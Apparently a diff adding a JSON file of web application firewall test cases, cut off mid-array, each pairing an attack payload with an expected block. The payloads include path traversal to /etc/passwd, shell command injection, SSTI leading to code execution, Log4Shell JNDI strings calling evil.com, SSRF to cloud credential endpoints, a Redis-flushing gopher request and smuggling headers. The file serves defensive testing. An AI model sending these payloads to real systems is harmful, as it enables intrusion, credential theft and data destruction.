@@ -1,0 +1,952 @@
+[
+  {
+    "id": "CUSTOM-9999001-001",
+    "payload": "GET /api/../../../etc/passwd",
+    "tags": ["custom-rule", "traversal", "quick", "rule-9999001"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999001: Path traversal with ../",
+    "category": "WAF-Validation",
+    "custom_rule": "9999001"
+  },
+  {
+    "id": "CUSTOM-9999001-002",
+    "payload": "GET /api/..%2F..%2F..%2Fetc/passwd",
+    "tags": ["custom-rule", "traversal", "quick", "rule-9999001"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999001: URL-encoded path traversal",
+    "category": "WAF-Validation",
+    "custom_rule": "9999001"
+  },
+  {
+    "id": "CUSTOM-9999001-003",
+    "payload": "GET /api/..\\..\\..\\windows\\system32\\config\\sam",
+    "tags": ["custom-rule", "traversal", "quick", "rule-9999001"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999001: Windows-style backslash traversal",
+    "category": "WAF-Validation",
+    "custom_rule": "9999001"
+  },
+  {
+    "id": "CUSTOM-9999002-001",
+    "payload": "GET /api?cmd=;id",
+    "tags": ["custom-rule", "rce", "quick", "rule-9999002"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999002: Semicolon command injection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999002"
+  },
+  {
+    "id": "CUSTOM-9999002-002",
+    "payload": "GET /api?cmd=|cat /etc/passwd",
+    "tags": ["custom-rule", "rce", "quick", "rule-9999002"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999002: Pipe command injection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999002"
+  },
+  {
+    "id": "CUSTOM-9999002-003",
+    "payload": "GET /api?cmd=`whoami`",
+    "tags": ["custom-rule", "rce", "quick", "rule-9999002"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999002: Backtick command substitution",
+    "category": "WAF-Validation",
+    "custom_rule": "9999002"
+  },
+  {
+    "id": "CUSTOM-9999002-004",
+    "payload": "GET /api?cmd=$(id)",
+    "tags": ["custom-rule", "rce", "quick", "rule-9999002"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999002: $() command substitution",
+    "category": "WAF-Validation",
+    "custom_rule": "9999002"
+  },
+  {
+    "id": "CUSTOM-9999002-005",
+    "payload": "GET /api?cmd=${PATH}",
+    "tags": ["custom-rule", "rce", "quick", "rule-9999002"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999002: ${} variable expansion",
+    "category": "WAF-Validation",
+    "custom_rule": "9999002"
+  },
+  {
+    "id": "CUSTOM-9999002-006",
+    "payload": "GET /api?cmd=a&&id",
+    "tags": ["custom-rule", "rce", "quick", "rule-9999002"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999002: && command chaining",
+    "category": "WAF-Validation",
+    "custom_rule": "9999002"
+  },
+  {
+    "id": "CUSTOM-9999002-007",
+    "payload": "GET /api?cmd=a||id",
+    "tags": ["custom-rule", "rce", "quick", "rule-9999002"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999002: || command chaining",
+    "category": "WAF-Validation",
+    "custom_rule": "9999002"
+  },
+  {
+    "id": "CUSTOM-9999003-001",
+    "payload": "GET /webhook/test%00malicious",
+    "tags": ["custom-rule", "null-byte", "quick", "rule-9999003"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999003: Null byte in webhook path",
+    "category": "WAF-Validation",
+    "custom_rule": "9999003"
+  },
+  {
+    "id": "CUSTOM-9999004-001",
+    "payload": "GET /api/assets/../../../etc/passwd",
+    "tags": ["custom-rule", "traversal", "immich", "quick", "rule-9999004"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999004: Immich asset path traversal",
+    "category": "WAF-Validation",
+    "custom_rule": "9999004"
+  },
+  {
+    "id": "CUSTOM-9999006-001",
+    "payload": "GET / HTTP/1.1\r\nHost: evil.com",
+    "tags": ["custom-rule", "dns-rebinding", "quick", "rule-9999006"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999006: Invalid host header",
+    "category": "WAF-Validation",
+    "custom_rule": "9999006"
+  },
+  {
+    "id": "CUSTOM-9999006-002",
+    "payload": "GET / HTTP/1.1\r\nHost: attacker.example.com.evil.com",
+    "tags": ["custom-rule", "dns-rebinding", "quick", "rule-9999006"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999006: Subdomain confusion attack",
+    "category": "WAF-Validation",
+    "custom_rule": "9999006"
+  },
+  {
+    "id": "CUSTOM-9999007-001",
+    "payload": "POST /api/data HTTP/1.1\r\nX-HTTP-Method-Override: DELETE",
+    "tags": ["custom-rule", "method-override", "quick", "rule-9999007"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999007: HTTP method override via X-HTTP-Method-Override",
+    "category": "WAF-Validation",
+    "custom_rule": "9999007"
+  },
+  {
+    "id": "CUSTOM-9999007-002",
+    "payload": "POST /api/data HTTP/1.1\r\nX-HTTP-Method: PUT",
+    "tags": ["custom-rule", "method-override", "rule-9999007"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999007: HTTP method override via X-HTTP-Method",
+    "category": "WAF-Validation",
+    "custom_rule": "9999007"
+  },
+  {
+    "id": "CUSTOM-9999007-003",
+    "payload": "POST /api/data HTTP/1.1\r\nX-Method-Override: PATCH",
+    "tags": ["custom-rule", "method-override", "rule-9999007"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999007: HTTP method override via X-Method-Override",
+    "category": "WAF-Validation",
+    "custom_rule": "9999007"
+  },
+  {
+    "id": "CUSTOM-9999008-001",
+    "payload": "GET /api?input={{config.__class__.__mro__}}",
+    "tags": ["custom-rule", "ssti", "quick", "rule-9999008"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999008: Jinja2 SSTI via __class__.__mro__",
+    "category": "WAF-Validation",
+    "custom_rule": "9999008"
+  },
+  {
+    "id": "CUSTOM-9999008-002",
+    "payload": "GET /api?input={{self.__class__.__subclasses__()}}",
+    "tags": ["custom-rule", "ssti", "quick", "rule-9999008"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999008: Jinja2 SSTI via __subclasses__",
+    "category": "WAF-Validation",
+    "custom_rule": "9999008"
+  },
+  {
+    "id": "CUSTOM-9999008-003",
+    "payload": "GET /api?input={{request.__class__.__builtins__.__import__('os').popen('id')}}",
+    "tags": ["custom-rule", "ssti", "rule-9999008"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999008: Jinja2 SSTI RCE via __builtins__",
+    "category": "WAF-Validation",
+    "custom_rule": "9999008"
+  },
+  {
+    "id": "CUSTOM-9999008-004",
+    "payload": "GET /api?input={%import os%}{{os.popen('id').read()}}",
+    "tags": ["custom-rule", "ssti", "rule-9999008"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999008: Twig SSTI via {%import%}",
+    "category": "WAF-Validation",
+    "custom_rule": "9999008"
+  },
+  {
+    "id": "CUSTOM-9999008-005",
+    "payload": "GET /api?input=${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "tags": ["custom-rule", "ssti", "rule-9999008"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999008: Spring SpEL SSTI",
+    "category": "WAF-Validation",
+    "custom_rule": "9999008"
+  },
+  {
+    "id": "CUSTOM-9999020-001",
+    "payload": "{\"__proto__\":{\"isAdmin\":true}}",
+    "tags": ["custom-rule", "prototype-pollution", "quick", "rule-9999020"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999020: Prototype pollution via __proto__",
+    "category": "WAF-Validation",
+    "custom_rule": "9999020"
+  },
+  {
+    "id": "CUSTOM-9999020-002",
+    "payload": "{\"constructor\":{\"prototype\":{\"polluted\":true}}}",
+    "tags": ["custom-rule", "prototype-pollution", "quick", "rule-9999020"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999020: Prototype pollution via constructor.prototype",
+    "category": "WAF-Validation",
+    "custom_rule": "9999020"
+  },
+  {
+    "id": "CUSTOM-9999020-003",
+    "payload": "GET /api?obj[constructor][prototype][admin]=1",
+    "tags": ["custom-rule", "prototype-pollution", "rule-9999020"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999020: Query string prototype pollution",
+    "category": "WAF-Validation",
+    "custom_rule": "9999020"
+  },
+  {
+    "id": "CUSTOM-9999021-001",
+    "payload": "${jndi:ldap://evil.com/a}",
+    "tags": ["custom-rule", "log4shell", "quick", "rule-9999021"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999021: Log4Shell basic JNDI LDAP",
+    "category": "WAF-Validation",
+    "custom_rule": "9999021"
+  },
+  {
+    "id": "CUSTOM-9999021-002",
+    "payload": "${jndi:rmi://evil.com/a}",
+    "tags": ["custom-rule", "log4shell", "quick", "rule-9999021"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999021: Log4Shell JNDI RMI",
+    "category": "WAF-Validation",
+    "custom_rule": "9999021"
+  },
+  {
+    "id": "CUSTOM-9999021-003",
+    "payload": "${${lower:j}ndi:ldap://evil.com/a}",
+    "tags": ["custom-rule", "log4shell", "evasion", "rule-9999021"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999021: Log4Shell with ${lower:} evasion",
+    "category": "WAF-Validation",
+    "custom_rule": "9999021"
+  },
+  {
+    "id": "CUSTOM-9999021-004",
+    "payload": "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.com/a}",
+    "tags": ["custom-rule", "log4shell", "evasion", "rule-9999021"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999021: Log4Shell with ${upper:} evasion",
+    "category": "WAF-Validation",
+    "custom_rule": "9999021"
+  },
+  {
+    "id": "CUSTOM-9999021-005",
+    "payload": "${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://evil.com/a}",
+    "tags": ["custom-rule", "log4shell", "evasion", "rule-9999021"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999021: Log4Shell with ${env:} evasion",
+    "category": "WAF-Validation",
+    "custom_rule": "9999021"
+  },
+  {
+    "id": "CUSTOM-9999022-001",
+    "payload": "GET /admin%09",
+    "tags": ["custom-rule", "path-confusion", "quick", "rule-9999022"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999022: Tab character in URI (%09)",
+    "category": "WAF-Validation",
+    "custom_rule": "9999022"
+  },
+  {
+    "id": "CUSTOM-9999022-002",
+    "payload": "GET /admin%0C",
+    "tags": ["custom-rule", "path-confusion", "rule-9999022"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999022: Form-feed character in URI (%0C)",
+    "category": "WAF-Validation",
+    "custom_rule": "9999022"
+  },
+  {
+    "id": "CUSTOM-9999023-001",
+    "payload": "GET /admin;/config",
+    "tags": ["custom-rule", "path-confusion", "quick", "rule-9999023"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999023: Semicolon in path (Spring Boot bypass)",
+    "category": "WAF-Validation",
+    "custom_rule": "9999023"
+  },
+  {
+    "id": "CUSTOM-9999023-002",
+    "payload": "GET /admin;.js",
+    "tags": ["custom-rule", "path-confusion", "rule-9999023"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999023: Semicolon extension bypass",
+    "category": "WAF-Validation",
+    "custom_rule": "9999023"
+  },
+  {
+    "id": "CUSTOM-9999024-001",
+    "payload": "GET /api?path=%252e%252e%252f",
+    "tags": ["custom-rule", "double-encoding", "quick", "rule-9999024"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999024: Double URL-encoded ../",
+    "category": "WAF-Validation",
+    "custom_rule": "9999024"
+  },
+  {
+    "id": "CUSTOM-9999024-002",
+    "payload": "GET /api?path=%253a%252f%252f",
+    "tags": ["custom-rule", "double-encoding", "rule-9999024"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999024: Double URL-encoded ://",
+    "category": "WAF-Validation",
+    "custom_rule": "9999024"
+  },
+  {
+    "id": "CUSTOM-9999025-001",
+    "payload": "GET /api?q=%EF%BC%9Cscript%EF%BC%9E",
+    "tags": ["custom-rule", "unicode-bypass", "quick", "rule-9999025"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999025: Full-width < and > characters",
+    "category": "WAF-Validation",
+    "custom_rule": "9999025"
+  },
+  {
+    "id": "CUSTOM-9999025-002",
+    "payload": "GET /api?q=%EF%BD%81%EF%BD%84%EF%BD%8D%EF%BD%89%EF%BD%8E",
+    "tags": ["custom-rule", "unicode-bypass", "rule-9999025"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999025: Full-width 'admin' characters",
+    "category": "WAF-Validation",
+    "custom_rule": "9999025"
+  },
+  {
+    "id": "CUSTOM-9999026-001",
+    "payload": "GET /api?path=%c0%ae%c0%ae/etc/passwd",
+    "tags": ["custom-rule", "overlong-utf8", "quick", "rule-9999026"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999026: Overlong UTF-8 encoded .. (CVE-2000-0884)",
+    "category": "WAF-Validation",
+    "custom_rule": "9999026"
+  },
+  {
+    "id": "CUSTOM-9999026-002",
+    "payload": "GET /api?path=%c1%9c",
+    "tags": ["custom-rule", "overlong-utf8", "rule-9999026"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999026: Overlong UTF-8 backslash",
+    "category": "WAF-Validation",
+    "custom_rule": "9999026"
+  },
+  {
+    "id": "CUSTOM-9999027-001",
+    "payload": "POST /api HTTP/1.1\r\nTransfer-Encoding: chunked, identity",
+    "tags": ["custom-rule", "http-smuggling", "quick", "rule-9999027"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999027: TE obfuscation with multiple values",
+    "category": "WAF-Validation",
+    "custom_rule": "9999027"
+  },
+  {
+    "id": "CUSTOM-9999027-002",
+    "payload": "POST /api HTTP/1.1\r\nTransfer-Encoding: xchunked",
+    "tags": ["custom-rule", "http-smuggling", "rule-9999027"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999027: TE obfuscation xchunked",
+    "category": "WAF-Validation",
+    "custom_rule": "9999027"
+  },
+  {
+    "id": "CUSTOM-9999030-001",
+    "payload": "GET / HTTP/1.1\r\nHost: example.com\r\nHost: evil.com",
+    "tags": ["custom-rule", "host-injection", "quick", "rule-9999030"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999030: Multiple Host headers",
+    "category": "WAF-Validation",
+    "custom_rule": "9999030"
+  },
+  {
+    "id": "CUSTOM-9999031-001",
+    "payload": "GET / HTTP/1.1\r\nHost: example.com\r\nX-Forwarded-Host: evil.com",
+    "tags": ["custom-rule", "host-injection", "quick", "rule-9999031"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999031: X-Forwarded-Host injection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999031"
+  },
+  {
+    "id": "CUSTOM-9999032-001",
+    "payload": "GET / HTTP/1.1\r\nHost: example.com%0d%0aX-Injected: header",
+    "tags": ["custom-rule", "crlf-injection", "quick", "rule-9999032"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999032: CRLF injection in Host header",
+    "category": "WAF-Validation",
+    "custom_rule": "9999032"
+  },
+  {
+    "id": "CUSTOM-9999033-001",
+    "payload": "GET / HTTP/1.1\r\nHost: example.com.evil.com",
+    "tags": ["custom-rule", "host-spoofing", "quick", "rule-9999033"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999033: Host header subdomain spoofing",
+    "category": "WAF-Validation",
+    "custom_rule": "9999033"
+  },
+  {
+    "id": "CUSTOM-9999034-001",
+    "payload": "GET /admin%A0",
+    "tags": ["custom-rule", "acl-bypass", "quick", "rule-9999034"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999034: Non-breaking space nginx ACL bypass",
+    "category": "WAF-Validation",
+    "custom_rule": "9999034"
+  },
+  {
+    "id": "CUSTOM-9999035-001",
+    "payload": "GET /admin.php%00.jpg",
+    "tags": ["custom-rule", "null-byte", "quick", "rule-9999035"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999035: Null byte injection for extension bypass",
+    "category": "WAF-Validation",
+    "custom_rule": "9999035"
+  },
+  {
+    "id": "CUSTOM-9999036-001",
+    "payload": "GET /admin.php/index.php",
+    "tags": ["custom-rule", "php-bypass", "quick", "rule-9999036"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999036: PHP-FPM ACL bypass via nested PHP path",
+    "category": "WAF-Validation",
+    "custom_rule": "9999036"
+  },
+  {
+    "id": "CUSTOM-9999037-001",
+    "payload": "GET /api?id=1+un/**/ion+sel/**/ect+1,2,3--",
+    "tags": ["custom-rule", "waf-bypass", "quick", "rule-9999037"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999037: SQL comment-based WAF bypass",
+    "category": "WAF-Validation",
+    "custom_rule": "9999037"
+  },
+  {
+    "id": "CUSTOM-9999037-002",
+    "payload": "GET /api?q=<!--><script>alert/**/()/**/</script>",
+    "tags": ["custom-rule", "waf-bypass", "rule-9999037"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999037: HTML comment XSS bypass",
+    "category": "WAF-Validation",
+    "custom_rule": "9999037"
+  },
+  {
+    "id": "CUSTOM-9999038-001",
+    "payload": "GET / HTTP/0.9",
+    "tags": ["custom-rule", "protocol-downgrade", "quick", "rule-9999038"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999038: HTTP/0.9 protocol downgrade",
+    "category": "WAF-Validation",
+    "custom_rule": "9999038"
+  },
+  {
+    "id": "CUSTOM-9999039-001",
+    "payload": "get /login HTTP/1.1",
+    "tags": ["custom-rule", "method-bypass", "quick", "rule-9999039"],
+    "expected_block": true,
+    "severity_hint": "Low",
+    "notes": "Custom rule 9999039: Lowercase HTTP method bypass",
+    "category": "WAF-Validation",
+    "custom_rule": "9999039"
+  },
+  {
+    "id": "CUSTOM-9999040-001",
+    "payload": "  GET /login HTTP/1.1",
+    "tags": ["custom-rule", "whitespace-bypass", "quick", "rule-9999040"],
+    "expected_block": true,
+    "severity_hint": "Low",
+    "notes": "Custom rule 9999040: Leading whitespace in request line",
+    "category": "WAF-Validation",
+    "custom_rule": "9999040"
+  },
+  {
+    "id": "CUSTOM-9999041-001",
+    "payload": "GET / HTTP/1.1\r\nX-Query: value\r\n\t' OR '1'='1",
+    "tags": ["custom-rule", "line-folding", "quick", "rule-9999041"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999041: HTTP header line folding bypass",
+    "category": "WAF-Validation",
+    "custom_rule": "9999041"
+  },
+  {
+    "id": "CUSTOM-9999042-001",
+    "payload": "{\"query\":\"{ __schema { types { name } } }\"}",
+    "tags": ["custom-rule", "graphql", "introspection", "quick", "rule-9999042"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999042: GraphQL __schema introspection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999042"
+  },
+  {
+    "id": "CUSTOM-9999042-002",
+    "payload": "{\"query\":\"{ __type(name: \\\"User\\\") { fields { name } } }\"}",
+    "tags": ["custom-rule", "graphql", "introspection", "rule-9999042"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999042: GraphQL __type introspection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999042"
+  },
+  {
+    "id": "CUSTOM-9999043-001",
+    "payload": "[{\"query\":\"{ user(id:1) { id } }\"},{\"query\":\"{ user(id:2) { id } }\"}]",
+    "tags": ["custom-rule", "graphql", "batching", "quick", "rule-9999043"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999043: GraphQL batching attack",
+    "category": "WAF-Validation",
+    "custom_rule": "9999043"
+  },
+  {
+    "id": "CUSTOM-9999044-001",
+    "payload": "{\"query\":\"{ a { b { c { d { e { f { g { h { i { j { k { l } } } } } } } } } } } }\"}",
+    "tags": ["custom-rule", "graphql", "depth-attack", "quick", "rule-9999044"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999044: GraphQL query depth attack",
+    "category": "WAF-Validation",
+    "custom_rule": "9999044"
+  },
+  {
+    "id": "CUSTOM-9999045-001",
+    "payload": "{\"query\":\"{ a1:user(id:1){id} a2:user(id:2){id} a3:user(id:3){id} a4:user(id:4){id} a5:user(id:5){id} a6:user(id:6){id} a7:user(id:7){id} a8:user(id:8){id} a9:user(id:9){id} a10:user(id:10){id} a11:user(id:11){id} a12:user(id:12){id} a13:user(id:13){id} a14:user(id:14){id} a15:user(id:15){id} a16:user(id:16){id} a17:user(id:17){id} a18:user(id:18){id} a19:user(id:19){id} a20:user(id:20){id} a21:user(id:21){id} }\"}",
+    "tags": ["custom-rule", "graphql", "aliasing", "quick", "rule-9999045"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999045: GraphQL field aliasing abuse (21+ aliases)",
+    "category": "WAF-Validation",
+    "custom_rule": "9999045"
+  },
+  {
+    "id": "CUSTOM-9999046-001",
+    "payload": "{\"query\":\"{ user @admin { id } }\"}",
+    "tags": ["custom-rule", "graphql", "directive", "quick", "rule-9999046"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999046: GraphQL @admin directive injection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999046"
+  },
+  {
+    "id": "CUSTOM-9999046-002",
+    "payload": "{\"query\":\"{ user @exec(cmd: \\\"id\\\") { id } }\"}",
+    "tags": ["custom-rule", "graphql", "directive", "rule-9999046"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999046: GraphQL @exec directive injection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999046"
+  },
+  {
+    "id": "CUSTOM-9999047-001",
+    "payload": "{\"query\":\"fragment A on User { ...B } fragment B on User { ...A } { user { ...A } }\"}",
+    "tags": ["custom-rule", "graphql", "fragment-cycle", "quick", "rule-9999047"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999047: GraphQL fragment cycling DoS",
+    "category": "WAF-Validation",
+    "custom_rule": "9999047"
+  },
+  {
+    "id": "CUSTOM-9999048-001",
+    "payload": "GET /api?url=http://127.0.0.1:8080/admin",
+    "tags": ["custom-rule", "ssrf", "localhost", "quick", "rule-9999048"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999048: SSRF via 127.0.0.1",
+    "category": "WAF-Validation",
+    "custom_rule": "9999048"
+  },
+  {
+    "id": "CUSTOM-9999048-002",
+    "payload": "GET /api?url=http://localhost/admin",
+    "tags": ["custom-rule", "ssrf", "localhost", "quick", "rule-9999048"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999048: SSRF via localhost",
+    "category": "WAF-Validation",
+    "custom_rule": "9999048"
+  },
+  {
+    "id": "CUSTOM-9999048-003",
+    "payload": "GET /api?url=http://0.0.0.0/",
+    "tags": ["custom-rule", "ssrf", "localhost", "rule-9999048"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999048: SSRF via 0.0.0.0",
+    "category": "WAF-Validation",
+    "custom_rule": "9999048"
+  },
+  {
+    "id": "CUSTOM-9999048-004",
+    "payload": "GET /api?url=http://[::1]/admin",
+    "tags": ["custom-rule", "ssrf", "localhost", "rule-9999048"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999048: SSRF via IPv6 localhost [::1]",
+    "category": "WAF-Validation",
+    "custom_rule": "9999048"
+  },
+  {
+    "id": "CUSTOM-9999048-005",
+    "payload": "GET /api?url=http://2130706433/",
+    "tags": ["custom-rule", "ssrf", "localhost", "rule-9999048"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999048: SSRF via decimal IP (2130706433=127.0.0.1)",
+    "category": "WAF-Validation",
+    "custom_rule": "9999048"
+  },
+  {
+    "id": "CUSTOM-9999049-001",
+    "payload": "GET /api?url=http://169.254.169.254/latest/meta-data/",
+    "tags": ["custom-rule", "ssrf", "cloud-metadata", "quick", "rule-9999049"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999049: SSRF AWS metadata endpoint",
+    "category": "WAF-Validation",
+    "custom_rule": "9999049"
+  },
+  {
+    "id": "CUSTOM-9999049-002",
+    "payload": "GET /api?url=http://metadata.google.internal/computeMetadata/v1/",
+    "tags": ["custom-rule", "ssrf", "cloud-metadata", "rule-9999049"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999049: SSRF GCP metadata endpoint",
+    "category": "WAF-Validation",
+    "custom_rule": "9999049"
+  },
+  {
+    "id": "CUSTOM-9999049-003",
+    "payload": "GET /api?url=http://169.254.170.2/v2/credentials/",
+    "tags": ["custom-rule", "ssrf", "cloud-metadata", "rule-9999049"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999049: SSRF AWS ECS task credentials",
+    "category": "WAF-Validation",
+    "custom_rule": "9999049"
+  },
+  {
+    "id": "CUSTOM-9999050-001",
+    "payload": "GET /api?url=http://evil.rbndr.us/",
+    "tags": ["custom-rule", "ssrf", "dns-rebinding", "quick", "rule-9999050"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999050: DNS rebinding via rbndr.us",
+    "category": "WAF-Validation",
+    "custom_rule": "9999050"
+  },
+  {
+    "id": "CUSTOM-9999050-002",
+    "payload": "GET /api?url=http://127.0.0.1.nip.io/",
+    "tags": ["custom-rule", "ssrf", "dns-rebinding", "rule-9999050"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999050: DNS rebinding via nip.io",
+    "category": "WAF-Validation",
+    "custom_rule": "9999050"
+  },
+  {
+    "id": "CUSTOM-9999050-003",
+    "payload": "GET /api?url=http://127.0.0.1.sslip.io/",
+    "tags": ["custom-rule", "ssrf", "dns-rebinding", "rule-9999050"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999050: DNS rebinding via sslip.io",
+    "category": "WAF-Validation",
+    "custom_rule": "9999050"
+  },
+  {
+    "id": "CUSTOM-9999051-001",
+    "payload": "GET /api?url=http://10.0.0.1/admin",
+    "tags": ["custom-rule", "ssrf", "internal", "quick", "rule-9999051"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999051: SSRF internal network 10.x.x.x",
+    "category": "WAF-Validation",
+    "custom_rule": "9999051"
+  },
+  {
+    "id": "CUSTOM-9999051-002",
+    "payload": "GET /api?url=http://192.168.1.1/",
+    "tags": ["custom-rule", "ssrf", "internal", "rule-9999051"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999051: SSRF internal network 192.168.x.x",
+    "category": "WAF-Validation",
+    "custom_rule": "9999051"
+  },
+  {
+    "id": "CUSTOM-9999051-003",
+    "payload": "GET /api?url=http://172.16.0.1/",
+    "tags": ["custom-rule", "ssrf", "internal", "rule-9999051"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999051: SSRF internal network 172.16.x.x",
+    "category": "WAF-Validation",
+    "custom_rule": "9999051"
+  },
+  {
+    "id": "CUSTOM-9999052-001",
+    "payload": "GET /api?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall",
+    "tags": ["custom-rule", "ssrf", "protocol", "quick", "rule-9999052"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999052: SSRF via gopher protocol (Redis)",
+    "category": "WAF-Validation",
+    "custom_rule": "9999052"
+  },
+  {
+    "id": "CUSTOM-9999052-002",
+    "payload": "GET /api?url=file:///etc/passwd",
+    "tags": ["custom-rule", "ssrf", "protocol", "quick", "rule-9999052"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999052: SSRF via file:// protocol",
+    "category": "WAF-Validation",
+    "custom_rule": "9999052"
+  },
+  {
+    "id": "CUSTOM-9999052-003",
+    "payload": "GET /api?url=dict://127.0.0.1:11211/stat",
+    "tags": ["custom-rule", "ssrf", "protocol", "rule-9999052"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999052: SSRF via dict:// protocol (memcached)",
+    "category": "WAF-Validation",
+    "custom_rule": "9999052"
+  },
+  {
+    "id": "CUSTOM-9999053-001",
+    "payload": "GET /api?url=%6c%6f%63%61%6c%68%6f%73%74",
+    "tags": ["custom-rule", "ssrf", "encoding", "quick", "rule-9999053"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999053: SSRF URL-encoded localhost",
+    "category": "WAF-Validation",
+    "custom_rule": "9999053"
+  },
+  {
